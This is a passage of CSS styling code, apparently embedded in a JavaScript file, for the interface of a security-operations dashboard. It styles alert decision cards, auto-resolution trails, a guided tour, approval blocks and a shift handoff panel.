body.mode-day .brief-scroll #sec-auto{border:1px solid color-mix(in srgb,var(--dec) 13%,var(--line)) !important;border-radius:var(--r-md) !important;background:linear-gradient(180deg,color-mix(in srgb,var(--dec) 9%,var(--panel)) 0px,var(--panel) 150px) !important;padding:0 !important;margin:0 0 26px !important}
body.mode-day .brief-scroll #sec-auto .decision-h{margin:0 !important;padding:12px 12px 9px !important;border-bottom-color:color-mix(in srgb,var(--dec) 13%,var(--line)) !important}
body.mode-day .brief-scroll #sec-auto .rad-auto{border-bottom-color:color-mix(in srgb,var(--dec) 13%,var(--line)) !important}
body.mode-day .brief-scroll #sec-auto .rad-auto:last-child{border-bottom:none !important}
/* dark mode: more noticeable category-tinted gradient on each section card */
body.theme-dark.mode-day .brief-scroll #sec-contain,
body.theme-dark.mode-day .brief-scroll #sec-escalate,
body.theme-dark.mode-day .brief-scroll #sec-investigate,
body.theme-dark.mode-day .brief-scroll #sec-tune,
body.theme-dark.mode-day .brief-scroll #sec-auto{
  background:linear-gradient(178deg,color-mix(in srgb,var(--dec) 30%,var(--panel)) 0,color-mix(in srgb,var(--dec) 12%,var(--panel)) 120px,color-mix(in srgb,var(--dec) 5%,var(--panel)) 300px) !important;
  border-color:color-mix(in srgb,var(--dec) 30%,var(--line)) !important;
}
body.theme-dark.mode-day .brief-scroll #sec-contain .decision-h,
body.theme-dark.mode-day .brief-scroll #sec-escalate .decision-h,
body.theme-dark.mode-day .brief-scroll #sec-investigate .decision-h,
body.theme-dark.mode-day .brief-scroll #sec-tune .decision-h,
body.theme-dark.mode-day .brief-scroll #sec-auto .decision-h{border-bottom-color:color-mix(in srgb,var(--dec) 26%,var(--line)) !important}
body.mode-day .brief-scroll .ov-secstat{display:none !important}
body.mode-day .brief-scroll .ov-sec-title{font-size:10.5px;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-4)}
body.mode-day .brief-scroll .ov-sec-figure{gap:5px}
body.mode-day .brief-scroll .ov-secnum{font-size:21px;font-weight:650;color:var(--ink-0) !important;font-family:var(--sans)}
body.mode-day .brief-scroll .ov-secunit{color:var(--ink-4)}
body.mode-day .brief-scroll .ov-secsub{display:none}
body.mode-day .brief-scroll .ov-foot{margin-top:14px}
body.mode-day .brief-scroll .ov-chip .ov-dot{display:none !important}

/* section headers: simple neutral label + count over a hairline */
body.mode-day .brief-scroll .decision-sec{margin-bottom:26px !important}
body.mode-day .brief-scroll .decision-h{margin-bottom:10px !important;gap:8px;align-items:center;padding:0 2px 8px;border:none;border-bottom:1px solid var(--line);border-radius:0;background:none}
body.mode-day .brief-scroll .dec-dot{display:block !important;width:7px !important;height:7px !important}
body.mode-day .brief-scroll .dec-h-label{color:var(--ink-3) !important;font-size:11px !important;font-weight:600 !important;letter-spacing:.05em !important;text-transform:uppercase}
body.mode-day .brief-scroll .rad-cnt{color:var(--ink-3) !important;background:var(--panel) !important;border:1px solid var(--line-2) !important;border-radius:999px !important;padding:1px 8px !important;font-weight:600;font-family:var(--mono);font-size:10.5px}
body.mode-day .brief-scroll .radar-sec-sub{display:none !important}

/* active proposals → borderless single-line list rows */
body.mode-day .brief-scroll .rad-mini{border:none !important;border-radius:0 !important;background:transparent !important;box-shadow:none !important;padding:22px 12px 20px !important;margin:0 !important;border-bottom:1px solid var(--line) !important;transition:background .12s ease}
body.mode-day .brief-scroll .rad-auto{border-bottom:1px solid var(--line) !important}
body.mode-day .brief-scroll .rad-mini:hover{background:color-mix(in srgb,var(--dec) 5%,var(--panel)) !important;box-shadow:none !important;border-bottom-color:var(--line) !important}
body.mode-day .brief-scroll .rad-mini.sel{background:color-mix(in srgb,var(--sev) 6%,var(--panel)) !important;border-radius:0 !important;box-shadow:none !important}
body.mode-day .brief-scroll .rad-mini-head{align-items:center;gap:12px}
/* score badge — tinted rounded square, colored by severity */
body.mode-day .brief-scroll .rad-mini-score{display:inline-flex !important}

/* title, then description on the line below */
body.mode-day .brief-scroll .rad-mini-titlewrap{display:flex;flex-direction:column;gap:3px;min-width:0;flex:1}
body.mode-day .brief-scroll .rad-mini-titlerow{flex:0 0 auto;min-width:0;max-width:none;flex-wrap:nowrap;gap:7px}
body.mode-day .brief-scroll .rad-mini-title{flex:0 1 auto;min-width:0;font-size:13px;font-weight:600;color:var(--ink-1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block}
body.mode-day .brief-scroll .rad-mini-titlerow .rad-id{flex:0 0 auto;color:var(--ink-4) !important;font-size:10.5px}
body.mode-day .brief-scroll .rad-mini-motion{color:var(--ink-4) !important}
body.mode-day .brief-scroll .rad-mini-motion svg{color:var(--ink-4) !important}
body.mode-day .brief-scroll .rad-mini-note{flex:0 0 auto;margin-top:0 !important;font-size:12px;line-height:1.45;color:var(--ink-3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block !important;-webkit-line-clamp:unset !important}
body.mode-day .brief-scroll .rad-mini-note b{color:var(--ink-3) !important;font-weight:600}
body.mode-day .brief-scroll .rad-mini-when{flex:0 0 auto;align-self:flex-start;font-size:11px;color:var(--ink-4)}
/* recommended action — compact second line, neutral until it's a destructive confirm */
body.mode-day .brief-scroll .rad-mini-acts{margin:11px 0 1px 38px !important;padding-top:11px !important;border-top:1px dashed var(--line-2) !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-act-btns{gap:7px;justify-content:flex-end}
body.mode-day .brief-scroll .rad-mini-acts .rad-act{padding:5px 11px !important;font-size:11.5px;font-weight:600;background:var(--panel) !important;border:1px solid color-mix(in srgb,var(--blue) 32%,transparent) !important;color:var(--blue-d) !important;transition:background .12s,color .12s,border-color .12s}
body.mode-day .brief-scroll .rad-mini-acts .rad-act svg{color:var(--blue) !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-act.rad-act-more{background:transparent !important;color:var(--ink-4) !important;padding:5px 7px !important;border:none !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-act.rad-act-more svg{color:var(--ink-3) !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-act.rad-act-more:hover{background:var(--bg-2) !important;color:var(--ink-1) !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-act:hover{background:color-mix(in srgb,var(--blue) 18%,var(--panel)) !important;border-color:color-mix(in srgb,var(--blue) 50%,transparent) !important;color:var(--blue-d) !important}
body.mode-day .brief-scroll .rad-act.gated{background:var(--panel) !important;color:var(--red-d) !important;border-color:color-mix(in srgb,var(--red) 30%,transparent) !important}
body.mode-day .brief-scroll .rad-act.gated svg{color:var(--red) !important}
body.mode-day .brief-scroll .rad-act.gated:hover{background:color-mix(in srgb,var(--red) 16%,var(--panel)) !important;border-color:color-mix(in srgb,var(--red) 50%,transparent) !important;color:var(--red-d) !important}
body.mode-day .brief-scroll .rad-act.gated:hover svg{color:var(--red-d) !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-chat{margin-left:0 !important;padding:5px 7px !important;font-size:11.5px;font-weight:600;color:var(--accent-d) !important;background:transparent !important;border:none !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-chat svg{color:var(--accent) !important}
body.mode-day .brief-scroll .rad-mini-acts .rad-chat:hover{color:var(--accent-d) !important;background:color-mix(in srgb,var(--accent) 14%,var(--panel)) !important}
.rad-act-div{flex:0 0 auto;align-self:center;width:1px;height:14px;margin:0 3px;background:var(--line-2)}
body.mode-day .brief-scroll .rad-mini-acts .rad-act-div{align-self:center;height:14px;margin:0 4px;background:var(--line-2)}

/* passive rows (suppress / monitor / dismiss) — fully neutral, tight */
body.mode-day .brief-scroll .decision-passive .rad-watch{padding:7px 10px !important}
body.mode-day .brief-scroll .decision-passive .rad-watch-ic{background:var(--bg-2) !important;color:var(--ink-4) !important}
body.mode-day .brief-scroll .rad-watch-t{color:var(--ink-1) !important}
body.mode-day .brief-scroll .rad-watch-note{color:var(--ink-4) !important}
body.mode-day .brief-scroll .rad-dec.sm{color:var(--ink-4) !important;background:var(--bg-2) !important}

/* floating chat CTA — single on-brand accent, calmer shadow */
body.mode-day .chat-badge{background:var(--accent) !important;border-color:rgba(255,255,255,.22) !important;box-shadow:0 6px 20px rgba(20,30,55,.16),0 0 0 1px rgba(20,30,55,.04) !important}
body.mode-day .chat-badge:hover{background:var(--accent-d) !important;box-shadow:0 10px 26px rgba(20,30,55,.22) !important}
/* Queue / History toggle */
.q-switch{display:inline-flex;gap:4px;margin:2px 0 22px;padding:3px;background:var(--bg-2);border-radius:var(--r-md)}
.q-tab{display:inline-flex;align-items:center;gap:7px;padding:6px 15px;border-radius:var(--r-sm);font-size:12.5px;font-weight:600;color:var(--ink-3);transition:.12s;font-family:inherit}
.q-tab:hover{color:var(--ink-1)}
.q-tab.on{background:var(--panel);color:var(--ink-0);box-shadow:var(--sh-xs)}
.q-cnt{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--ink-4)}
.q-tab.on .q-cnt{color:var(--accent-d)}
.hist-legend{display:flex;align-items:center;gap:20px;margin:0 0 8px;padding:0 6px;font-size:11px;color:var(--ink-4)}
.hist-legend>span{display:inline-flex;align-items:center;gap:7px}
.hist-leg-dot{width:7px;height:7px;border-radius:50%}
.hist-list{display:flex;flex-direction:column}
.hist-row{display:flex;align-items:center;gap:14px;padding:15px 6px;border-bottom:1px solid var(--line)}
.hist-row:hover{background:color-mix(in srgb,var(--ink-3) 6%,transparent)}
.hist-ic{flex:0 0 auto;display:inline-flex;align-items:center;gap:7px;width:32px}
.hist-dot{width:8px;height:8px;border-radius:50%;flex:0 0 auto}
.hist-bolt{display:inline-flex;color:var(--ink-4)}
.hist-title{flex:1;min-width:0;font-size:13px;color:var(--ink-1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.hist-actor{flex:0 0 auto;display:inline-flex;align-items:center;gap:7px;font-size:12px;color:var(--ink-3)}
.hist-av{width:20px;height:20px;border-radius:50%;display:grid;place-items:center;font-size:8.5px;font-weight:700;color:#fff;background:var(--ink-4)}
.hist-status{flex:0 0 auto;width:84px;text-align:right;font-size:10.5px;font-weight:700;letter-spacing:.05em}
.hist-status.auto{color:var(--ink-4)}
.hist-status.approved{color:var(--green)}
.hist-status.dismissed{color:var(--red)}
.hist-when{flex:0 0 auto;width:60px;text-align:right;font-size:11px;color:var(--ink-4)}

/* ===== Flow 1 \u2014 fully automated, rich evidence (auto-resolved Watch card) ===== */
.rad-auto{--auto:#0B8A85;position:relative;border:none;border-radius:0;background:transparent;padding:22px 12px;margin:0;cursor:pointer;transition:background .13s}
.rad-auto:hover{background:color-mix(in srgb,var(--ink-3) 5%,transparent)}
.rad-auto.sel{background:color-mix(in srgb,var(--red) 6%,var(--panel))}
.rad-auto-head{display:flex;align-items:flex-start;gap:12px}
.rad-auto-ic{flex:0 0 auto;width:26px;height:26px;border-radius:7px;display:grid;place-items:center;background:color-mix(in srgb,var(--red) 13%,transparent);color:var(--red)}
.rad-auto-tw{flex:1;min-width:0}
.rad-auto-tr{display:flex;align-items:center;gap:9px;flex-wrap:wrap}
.rad-auto-title{font-size:13.5px;font-weight:600;color:var(--ink-1)}
.rad-auto-badge{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;letter-spacing:.03em;text-transform:uppercase;color:#fff;background:var(--auto);padding:2px 8px;border-radius:999px}
.rad-auto-badge svg{color:#fff}
.rad-auto-note{font-size:12.5px;line-height:1.55;color:var(--ink-3);margin-top:5px}
.rad-auto-note b{color:var(--ink-2);font-weight:600}
.rad-auto-note code{font-family:var(--mono);font-size:11px;background:var(--bg-2);padding:1px 5px;border-radius:4px}
.rad-auto-strip{display:flex;align-items:baseline;gap:10px}
.rad-auto-tok{flex:0 0 auto;display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--auto);background:color-mix(in srgb,var(--auto) 13%,transparent);padding:3px 9px;border-radius:999px}
.rad-auto-tok svg{color:var(--auto)}
.rad-auto-did{font-size:12px;line-height:1.5;color:var(--ink-3)}
.rad-auto-perm{display:flex;align-items:flex-start;gap:8px;margin:0;padding:9px 11px;font-size:11.5px;line-height:1.5;color:var(--ink-3);background:var(--bg-2);border-radius:var(--r-sm)}
.rad-auto-perm svg{color:var(--ink-4);position:relative;top:2px;flex:0 0 auto}
.rad-auto-perm b{color:var(--ink-1);font-weight:600}
.rad-auto-link{color:var(--auto);font-weight:600;white-space:nowrap;cursor:pointer}
.rad-auto-link:hover{text-decoration:underline}
.rad-auto-foot{display:flex;align-items:center;gap:8px;margin:12px 0 0 38px;padding:9px 0 0;border-top:1px dashed var(--line-2)}
.rad-auto-foot .rad-watchacts{margin:0 0 0 6px;flex:0 0 auto}
.rad-auto-toggle{display:inline-flex;align-items:center;gap:8px;border:none;background:none;font:inherit;font-size:11.5px;font-weight:600;color:var(--ink-3);cursor:pointer;padding:0;text-align:left}
.rad-auto-acts{display:inline-flex;align-items:center;gap:7px;margin-left:auto}
.rad-auto-acts .rad-auto-archive{padding:5px 11px;font-size:11.5px;font-weight:600;background:var(--panel);border:1px solid color-mix(in srgb,var(--blue) 32%,transparent);color:var(--blue-d)}
.rad-auto-acts .rad-auto-archive svg{color:var(--blue)}
.rad-auto-acts .rad-auto-archive:hover{background:color-mix(in srgb,var(--blue) 18%,var(--panel));border-color:color-mix(in srgb,var(--blue) 50%,transparent)}
.rad-auto-acts .rad-act-more{background:transparent;border:none;color:var(--ink-4);padding:5px 7px}
.rad-auto-acts .rad-act-more svg{color:var(--ink-3)}
.rad-auto-acts .rad-act-more:hover{background:var(--bg-2);color:var(--ink-1)}
.rad-auto-acts .rad-chat.icon-only{padding:5px 7px}
.rad-auto-toggle:hover{color:var(--ink-1)}
.rat-caret{display:inline-flex;color:var(--ink-4);transform:rotate(-90deg);transition:transform .15s}
.rad-auto-trail{display:none;flex-direction:column;gap:8px;margin:11px 0 2px 38px}
.rad-auto.trail-open .rat-caret{transform:rotate(0)}
.rad-auto.trail-open .rad-auto-trail{display:flex;animation:trailIn .2s ease}
@keyframes trailIn{from{opacity:0;transform:translateY(-3px)}to{opacity:1;transform:none}}
.rat-sec-l{font-size:10px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-4);margin-top:5px}
.rat-sec-l:first-child{margin-top:0}
.rat-step{border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);overflow:hidden}
.rat-step-h{display:flex;align-items:center;gap:8px;padding:8px 11px;background:var(--bg-2)}
.rat-step-ic{display:inline-flex;color:var(--ink-3)}
.rat-step-l{flex:1;min-width:0;font-size:11.5px;font-weight:600;color:var(--ink-1)}
.rat-auto{flex:0 0 auto;display:inline-flex;align-items:center;gap:3px;font-size:9.5px;font-weight:700;letter-spacing:.03em;text-transform:uppercase;color:var(--green,#1f8a5b)}
.rat-auto svg{color:var(--green,#1f8a5b)}
.rat-step-q{font-family:var(--mono);font-size:10.5px;color:var(--ink-3);padding:8px 11px 3px;word-break:break-word}
.rat-step-r{font-size:11.5px;line-height:1.5;color:var(--ink-2);padding:3px 11px 9px}
.rat-step-r b{color:var(--ink-0);font-weight:600}
.rat-step-r code{font-family:var(--mono);font-size:10.5px;background:var(--bg-2);padding:1px 4px;border-radius:4px}
.rat-ev{display:flex;align-items:flex-start;gap:10px;padding:9px 11px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel)}
.rat-ev-n{flex:0 0 auto;width:18px;height:18px;border-radius:5px;display:grid;place-items:center;font-size:10px;font-weight:700;font-family:var(--mono);color:var(--ink-4);background:var(--bg-2)}
.rat-ev-b{flex:1;min-width:0}
.rat-ev-t{font-size:12px;font-weight:600;color:var(--ink-1)}
.rat-ev-m{display:flex;align-items:center;gap:12px;margin-top:3px;flex-wrap:wrap}
.rat-ev-src{display:inline-flex;align-items:center;gap:4px;font-size:10.5px;color:var(--ink-4)}
.rat-ev-conf{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:600;color:var(--cc,var(--ink-4))}
.rat-ev-dot{width:6px;height:6px;border-radius:50%;background:var(--cc,var(--ink-4))}
.rat-ev-status{flex:0 0 auto;display:inline-flex;align-items:center;gap:4px;font-size:10.5px;font-weight:600;color:var(--ink-3);white-space:nowrap}
.rat-ev-status.ok{color:var(--green,#1f8a5b)}
.rat-ev-status.ok svg{color:var(--green,#1f8a5b)}
body.theme-dark .rad-auto{--auto:#28C7BE}
body.theme-dark .rad-auto-badge,body.theme-dark .rad-auto-badge svg{color:#06201e}
/* Activity ledger: Auto-executed token + stat */
.act-tag.teal{color:#0B8A85;background:color-mix(in srgb,#0B8A85 13%,transparent)}
.act-stat .as-v.teal{color:#0B8A85}
body.theme-dark .act-tag.teal{color:#28C7BE;background:color-mix(in srgb,#28C7BE 16%,transparent)}
body.theme-dark .act-stat .as-v.teal{color:#28C7BE}
/* ===== Autonomous receipts — regular cards; badge + header chip are the markers ===== */
.rad-cnt-auto{display:inline-flex;align-items:center;margin-left:2px;padding:2px 8px;border-radius:999px;font-size:10.5px;font-weight:650;letter-spacing:.02em;color:var(--red-d,#B42318);background:color-mix(in srgb,var(--red,#D6403A) 12%,transparent)}
body.theme-dark .rad-cnt-auto{color:#F6928F;background:color-mix(in srgb,#F6928F 16%,transparent)}
.rad-cnt-motion{display:inline-flex;align-items:center;gap:5px;margin-left:2px;padding:2px 8px;border-radius:999px;font-size:10.5px;font-weight:650;letter-spacing:.02em;color:color-mix(in srgb,var(--dec,#B5850C) 78%,#000);background:color-mix(in srgb,var(--dec,#D6A72C) 12%,transparent)}
body.theme-dark .rad-cnt-motion{color:color-mix(in srgb,var(--dec,#EFC36A) 70%,#fff);background:color-mix(in srgb,var(--dec,#EFC36A) 18%,transparent)}
.rad-card-motion .rad-spin,.insp-motion .rad-spin{width:9px;height:9px}
.app-tabs .insp-motion{align-self:center;flex:0 0 auto;margin:0 2px}
/* slim stepped progress bar on in-motion cards */
.rad-prg{display:flex;align-items:center;gap:9px;margin:8px 0 2px}
.rad-prg-track{position:relative;flex:1;height:4px;border-radius:999px;background:color-mix(in srgb,var(--sev,#B5850C) 13%,transparent)}
.rad-prg-fill{position:relative;height:100%;border-radius:999px;background:color-mix(in srgb,var(--sev,#B5850C) 72%,transparent);transition:width .5s cubic-bezier(0.32,0.72,0,1)}
.rad-prg-head{position:absolute;right:-1px;top:50%;width:7px;height:7px;transform:translateY(-50%);border-radius:50%;background:var(--sev,#B5850C);z-index:2;animation:prgPulse 2.2s cubic-bezier(0.32,0.72,0,1) infinite}
@keyframes prgPulse{0%{box-shadow:0 0 0 0 color-mix(in srgb,var(--sev,#B5850C) 38%,transparent)}70%,100%{box-shadow:0 0 0 6px transparent}}
.rad-prg-notch{position:absolute;top:-1px;bottom:-1px;width:2px;border-radius:1px;background:var(--panel,#fff);z-index:1}
body.theme-dark .rad-prg-notch{background:var(--panel,#141a26)}
.rad-prg-lbl{flex:0 0 auto;font-size:10.5px;font-weight:550;color:var(--ink-4);font-variant-numeric:tabular-nums;white-space:nowrap}
/* flyout Progress section */
.insp-prog-sec .rad-prg{margin:10px 0 2px}
.ipg-spin{border-color:color-mix(in srgb,var(--sev,#B5850C) 30%,transparent);border-top-color:var(--sev,#B5850C)}
.ipg-pct{font-family:var(--mono);font-size:12px;font-weight:650;color:var(--sev,#B5850C)}
.ipg-steps{list-style:none;margin:12px 0 2px;padding:0}
.ipg-steps .ist{display:flex;align-items:center;gap:9px;padding:5px 0;font-size:12.5px;color:var(--ink-2)}
.ist-ic{flex:0 0 auto;display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;border-radius:50%}
.ist.done .ist-ic{background:color-mix(in srgb,var(--green,#1F8A5B) 13%,transparent);color:var(--green,#1F8A5B)}
.ist.run .ist-ic{background:color-mix(in srgb,var(--sev,#B5850C) 11%,transparent)}
.ist.todo .ist-ic::before{content:'';width:7px;height:7px;border-radius:50%;border:1.5px solid var(--line-1,#CAD3E2)}
.ist.todo{color:var(--ink-4)}
.ist.run .ist-l{font-weight:600;color:var(--ink-1)}
.ist-l{flex:1 1 auto;min-width:0}
.ist-t{flex:0 0 auto;font-size:11px;color:var(--ink-4);font-variant-numeric:tabular-nums}
.ist.run .ist-t{color:var(--sev,#B5850C);font-weight:600}
.receipts-ping{animation:receiptsPing 1.4s cubic-bezier(0.32,0.72,0,1) 1}
@keyframes receiptsPing{0%{box-shadow:0 0 0 0 color-mix(in srgb,var(--teal,#0B8A85) 40%,transparent)}100%{box-shadow:0 0 0 14px transparent}}
/* ===== Archived records — live rows landing in Cases & records ===== */
.cs-row-live td{animation:csRowNew 2.6s cubic-bezier(0.32,0.72,0,1) 1}
@keyframes csRowNew{0%,30%{background:color-mix(in srgb,var(--blue) 9%,transparent)}100%{background:transparent}}
.cs-recid{margin-left:8px;font-family:var(--mono);font-size:10.5px;font-weight:600;color:var(--ink-4)}
/* ===== Resolved overnight — digest lives in the brief subline; receipts block under Dismiss ===== */
.brief-subline .ovn-link{display:inline-flex;align-items:center;gap:3px;color:var(--teal,#0B8A85);font-weight:600;text-decoration:none;white-space:nowrap}
.brief-subline .ovn-link:hover{text-decoration:underline;text-underline-offset:3px}
.brief-subline .ovn-link svg{color:var(--teal,#0B8A85)}
.receipts-sec .rad-auto+.rad-auto{border-top:none}
.rad-receipt .rad-auto-ic{background:color-mix(in srgb,var(--teal,#0B8A85) 13%,transparent);color:var(--teal,#0B8A85)}
.rad-receipt-open svg{color:var(--ink-4)}
.rad-receipt-open:hover svg{color:var(--ink-1)}
/* flyout: autonomous-resolution trail sections */
.brief-doc .insp-auto{--auto:#0B8A85;display:flex;flex-direction:column;gap:8px}
body.theme-dark .brief-doc .insp-auto{--auto:#28C7BE}
.toast-act{margin-left:2px;border:0;background:none;font:inherit;font-size:12.5px;font-weight:600;color:var(--blue,#0B64DD);cursor:pointer;text-decoration:underline;text-underline-offset:2px;white-space:nowrap}
.toast-act:hover{color:color-mix(in srgb,var(--blue,#0B64DD) 82%,#000)}
`;
const TOUR_CSS = `
.tour-mask{position:fixed;inset:0;z-index:9500}
.tour-mask.no-spot{background:rgba(7,16,31,.62)}
.tour-spot{position:fixed;border-radius:9px;box-shadow:0 0 0 9999px rgba(7,16,31,.60);border:2px solid var(--accent);pointer-events:none;transition:left .26s var(--anim,cubic-bezier(.32,.72,0,1)),top .26s,width .26s,height .26s}
.tour-pop{position:fixed;z-index:9600;width:312px;max-width:calc(100vw - 24px);background:var(--panel);border:1px solid var(--line-2);border-radius:var(--r-md);box-shadow:var(--sh-lg);padding:16px 17px 14px;color:var(--ink-1);animation:tourpop .2s var(--anim,ease)}
@keyframes tourpop{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
.tour-pop.center{left:50% !important;top:50% !important;transform:translate(-50%,-50%) !important}
.tour-step{display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11px;font-weight:600;color:var(--accent-d);letter-spacing:.04em;margin-bottom:9px}
.tour-dots{display:flex;gap:4px;margin-left:auto}
.tour-dots i{width:5px;height:5px;border-radius:50%;background:var(--line-2)}
.tour-dots i.on{background:var(--accent)}
.tour-title{font-size:15.5px;font-weight:700;color:var(--ink-0);letter-spacing:-.01em;margin-bottom:6px}
.tour-body{font-size:13px;line-height:1.55;color:var(--ink-2);margin-bottom:15px}
.tour-foot{display:flex;align-items:center;justify-content:space-between;gap:10px}
.tour-skip{font-size:12px;font-weight:500;color:var(--ink-4);background:none;border:none;cursor:pointer;padding:6px 4px;font-family:inherit}
.tour-skip:hover{color:var(--ink-2)}
.tour-nav{display:flex;gap:8px}
.tour-btn{font-family:inherit;font-size:12.5px;font-weight:600;color:var(--accent-on,#fff);background:var(--accent);border:none;border-radius:var(--r-sm);padding:7px 16px;cursor:pointer;transition:background .13s}
.tour-btn:hover{background:var(--accent-d)}
.tour-btn.ghost{background:var(--bg-2);color:var(--ink-1)}
.tour-btn.ghost:hover{background:var(--line-2)}
.rail-tour .rii{color:var(--accent)}
.rail-tour:hover{background:var(--accent-bg)}
/* ===== Chat flyout removed — the chat icon opens the full case view (chat + record panel) ===== */
/* ===== Impact map (record overview) ===== */
.imp-map{margin:0 0 16px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);padding:2px 14px}
.card-more-pop .cmp-item.two{align-items:flex-start}
.card-more-pop .cmp-item.two svg{margin-top:2px}
.cmp-b{display:flex;flex-direction:column;gap:1px}
.cmp-hint{font-size:10.5px;font-weight:450;color:var(--ink-4)}
.imp-h{display:flex;align-items:center;gap:7px;font-size:11px;font-weight:650;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-3);margin-bottom:11px}
.imp-h svg{color:var(--ink-4)}
.imp-flow{display:flex;flex-direction:column}
.imp-stage{display:flex;flex-direction:column;gap:2px;padding:9px 0}
.imp-stage+.imp-stage{border-top:1px dashed var(--line-2)}
.imp-stage-k{font-size:10px;font-weight:650;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-4);margin-bottom:2px}
.imp-node{display:flex;align-items:center;gap:9px;padding:4px 0}
.imp-dot{width:7px;height:7px;border-radius:50%;flex:0 0 auto}
.imp-dot.risk{background:var(--red)}
.imp-dot.ok{background:var(--green)}
.imp-dot.watch{background:var(--amber)}
.imp-node svg{flex:0 0 auto;color:var(--ink-3)}
.imp-node-b{flex:1;min-width:0;display:flex;align-items:baseline;gap:8px}
.imp-node-n{font-size:12px;font-weight:600;color:var(--ink-1);white-space:nowrap}
.imp-node-m{font-size:11px;color:var(--ink-4);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.imp-tag{flex:0 0 auto;font-size:10px;font-weight:650;border-radius:999px;padding:2px 8px;white-space:nowrap}
.imp-tag.risk{color:var(--red-d);background:var(--red-bg)}
.imp-tag.ok{color:var(--green);background:var(--green-bg)}
.imp-tag.watch{color:var(--amber);background:var(--amber-bg)}
.imp-arr{flex:0 0 auto;align-self:center;color:var(--ink-4);display:flex;align-items:center}
/* ===== Two-person approval (critical containment) ===== */
.apprv{border-top:1px dashed var(--line-2);padding:10px 13px;display:flex;flex-direction:column;gap:7px}
.apprv-k{display:flex;align-items:center;gap:7px;font-size:10.5px;font-weight:650;letter-spacing:.04em;text-transform:uppercase;color:var(--red-d)}
.apprv-row{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--ink-2)}
.apprv-row b{color:var(--ink-1);font-weight:600}
.apprv-row .avatar{width:22px;height:22px;font-size:9px}
.apprv-st{margin-left:auto;display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:600;color:var(--ink-4)}
.apprv-st.ok{color:var(--green)}
.apprv-st.wait{color:var(--amber)}
/* ===== Shift handoff flyout ===== */
.brief-settings.brief-handoff{right:106px}
.ho-sec{margin-bottom:20px;--ho:var(--ink-4)}
.ho-sech{display:flex;align-items:center;gap:8px;margin-bottom:2px;padding:0 2px 8px;border-bottom:1px solid var(--line)}
.ho-dot{width:7px;height:7px;border-radius:50%;background:var(--ho);flex:0 0 auto}
.ho-sech h3{font-size:11px;font-weight:600;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-3);margin:0}
.ho-sech .c{font-size:11px;color:var(--ink-4);margin-left:auto}
.ho-sech.plain{border-bottom:none;padding-bottom:2px}
.ho-row{display:flex;align-items:flex-start;gap:9px;padding:9px 2px;border:none;border-bottom:1px dashed var(--line-2);background:none;margin:0;font-size:12px;line-height:1.5;color:var(--ink-1)}
.ho-row:last-child{border-bottom:none}
.ho-row svg{flex:0 0 auto;margin-top:2px}
.ho-row.done svg{color:var(--green)}
.ho-row.motion svg{color:var(--amber)}
.ho-row.wait svg{color:var(--red-d)}
.ho-row .ho-id{font-family:var(--mono);font-size:10.5px;color:var(--ink-4);margin-left:6px}
.ho-note{width:100%;min-height:74px;resize:vertical;font:inherit;font-size:12.5px;line-height:1.55;color:var(--ink-1);background:var(--panel);border:1px solid var(--line-2);border-radius:var(--r-sm);padding:9px 11px;outline:none;box-sizing:border-box}
.ho-note:focus{border-color:var(--accent)}
.ho-foot{display:flex;align-items:center;gap:8px;padding:13px 18px;border-top:1px solid var(--line);flex:0 0 auto}
.ho-foot .ho-hint{font-size:11px;color:var(--ink-4);margin-right:auto}
.ho-foot .btn{appearance:none;border:none;border-radius:var(--r-sm);font:inherit;font-size:12.5px;font-weight:600;padding:9px 15px;cursor:pointer;display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
.ho-foot .btn.go{background:var(--blue);color:#fff}
.ho-foot .btn.go:hover{background:var(--blue-d)}
.ho-foot .btn.go svg{color:#fff}
.ho-foot .btn.ghost{background:var(--panel);border:1px solid var(--line-2);color:var(--ink-2);font-weight:500}
.ho-foot .btn.ghost:hover{background:var(--bg-2)}
.ski-fly-ic.hist-fly-ic{background:color-mix(in srgb,var(--blue) 14%,transparent);color:var(--blue)}
.ski-fly-ic.set-fly-ic{background:color-mix(in srgb,var(--accent) 14%,transparent);color:var(--accent)}
.ski-fly-body .autp .aut-stopls span{padding:3px 6px}
.ski-fly-body .autp .aut-stopls span.first{margin-left:-6px}
.ski-fly-body .autp .aut-stopls span.last{margin-left:6px}
.set-fly-all{display:inline-flex;align-items:center;gap:7px;font-size:12px;font-weight:600;color:var(--ink-1);cursor:pointer}
.set-fly-all:hover{color:var(--accent-d)}
.set-fly-all svg{color:var(--ink-4)}
#histWrap .ski-fly,#setWrap .ski-fly,#hoWrap .ski-fly{width:640px}
#pageBody .pg-head{display:none}
/* ===== Guardrails: policy change log ===== */
.gr-log{width:100%;border-collapse:collapse;font-size:12px}
.gr-log th{text-align:left;font-weight:500;color:var(--ink-4);padding:7px 10px;border-bottom:1px solid var(--line);font-size:10.5px}
.gr-log td{padding:8px 10px;border-bottom:1px solid var(--line);color:var(--ink-1);vertical-align:top}
.gr-log tr:last-child td{border-bottom:none}
